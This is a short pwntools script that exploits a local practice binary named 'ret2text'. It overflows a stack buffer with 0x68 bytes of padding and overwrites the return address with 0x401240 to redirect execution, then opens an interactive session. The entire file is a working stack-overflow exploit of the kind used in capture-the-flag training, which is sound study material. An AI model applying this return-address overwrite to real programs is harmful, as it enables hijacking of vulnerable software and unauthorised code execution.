from pwn import *

p = process('cmake-build-debug/ret2text')
p.send('a' * 0x68 + p64(0x0000000000401240))
p.interactive()
